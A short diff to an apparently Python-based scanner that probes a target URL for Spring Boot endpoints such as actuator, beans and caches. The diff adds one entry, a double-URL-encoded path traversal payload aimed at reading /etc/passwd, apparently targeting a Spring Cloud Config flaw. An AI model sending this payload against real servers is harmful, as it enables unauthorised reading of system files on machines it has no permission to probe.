@@ -58,6 +58,7 @@ def info(url):
     dir_spring = [
             'actuator',
             'auditevents',
+            '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development',
             'autoconfig',
             'beans',
             'caches',
